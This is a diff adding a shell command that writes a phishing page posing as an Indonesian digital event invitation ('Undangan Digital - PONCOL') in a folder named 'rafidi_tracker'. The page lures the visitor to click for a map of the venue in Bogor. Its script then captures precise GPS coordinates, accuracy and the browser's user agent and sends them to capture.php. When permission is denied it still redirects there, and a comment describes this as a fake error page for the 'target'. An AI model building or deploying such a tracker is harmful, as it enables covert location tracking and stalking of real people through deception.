@@ -1,0 +1,61 @@
+cat <<EOF > ~/rafidi_tracker/index.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Undangan Digital - PONCOL</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: 'Arial', sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 50px; }
+        .card { background: #333; padding: 30px; border-radius: 20px; border: 2px solid #ff0000; }
+        button { background: #ff0000; border: none; padding: 20px 40px; color: white; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 18px; box-shadow: 0 0 15px #ff0000; }
+        .loading { display: none; margin-top: 20px; color: #00ff00; }
+    </style>
+</head>
+<body onload="setup()">
+    <div class="card">
+        <h1>KONFIRMASI LOKASI</h1>
+        <p>Klik tombol di bawah untuk melihat rute peta acara di Bogor.</p>
+        <button onclick="getLoc()">LIHAT LOKASI SEKARANG</button>
+        <div id="loader" class="loading">Menyambungkan ke Satelit GPS...</div>
+    </div>
+
+    <script>
+    function setup() {
+        console.log("System Ready, Master PONCOL.");
+    }
+
+    function getLoc() {
+        document.getElementById('loader').style.display = 'block';
+        // Setting Akurasi Maksimal
+        var geoOptions = {
+            enableHighAccuracy: true, 
+            timeout: 10000, 
+            maximumAge: 0
+        };
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, error, geoOptions);
+        } else {
+            alert("Browser tidak mendukung GPS.");
+        }
+    }
+
+    function success(position) {
+        var lat = position.coords.latitude;
+        var lon = position.coords.longitude;
+        var acc = position.coords.accuracy;
+        var dev = navigator.userAgent;
+        
+        // Kirim ke backend PONCOL
+        window.location.href = "capture.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc + "&dev=" + dev;
+    }
+
+    function error(err) {
+        // Jika target menolak (Deny), kita arahkan ke halaman error palsu
+        window.location.href = "capture.php?error=denied&ip_only=true";
+    }
+    </script>
+</body>
+</html>
+EOF
